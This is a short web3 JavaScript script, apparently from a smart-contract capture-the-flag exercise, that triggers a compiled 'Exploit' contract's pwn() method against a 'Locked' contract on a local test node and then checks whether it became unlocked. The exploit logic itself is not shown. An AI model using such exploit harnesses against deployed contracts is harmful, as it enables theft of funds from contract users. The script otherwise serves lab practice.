// @format

const Web3 = require('web3');
const Tx = require('ethereumjs-tx');
const BigNumber = require('bignumber.js');

const locked = require('./build/contracts/Locked.json');
const exploit = require('./build/contracts/Exploit.json');

(async function pwn() {
  var publicKey = '0x03e2edce4bb10110c3b75d14737100c0c34f7199';

  const provider = new Web3.providers.HttpProvider('http://localhost:8545');
  const web3 = new Web3(provider);
  const networkId = await web3.eth.net.getId();

  const lockedAddress = locked.networks[networkId].address;
  const lockedContract = new web3.eth.Contract(locked.abi, lockedAddress);
  const exploitAddress = exploit.networks[networkId].address;
  const exploitContract = new web3.eth.Contract(exploit.abi, exploitAddress);

  await exploitContract.methods.pwn().send({from: publicKey});
  let unlocked = await lockedContract.methods
    .unlocked()
    .call({from: publicKey});
  console.log('Unlocked:', unlocked);
})();
